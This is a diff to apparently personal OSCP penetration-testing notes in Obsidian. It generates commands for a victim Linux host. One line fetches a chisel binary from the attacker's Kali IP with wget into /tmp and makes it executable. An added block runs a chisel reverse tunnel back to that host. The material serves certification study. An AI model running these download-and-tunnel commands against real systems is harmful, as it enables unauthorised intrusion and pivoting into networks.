@@ -65,7 +65,7 @@ On VICTIM HOST (Linuxx86)
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `cd /tmp && wget http://${KaliIP}:80/chisel_1.11.5_linux_amd64 -O chisel && chmod +x chisel`;
+const command = `cd /tmp && wget http://${KaliIP}:80/Linux_AMD64_Chisel -O chisel && chmod +x chisel`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -81,6 +81,14 @@ dv.paragraph("```bash\n" + command + "\n```");
 ---
 
 # 3. Run Chisel Client (Target)
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `./chisel client ${KaliIP}:9999 R:[KALIPORT]:127.0.0.1:[TARGETPORT]`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
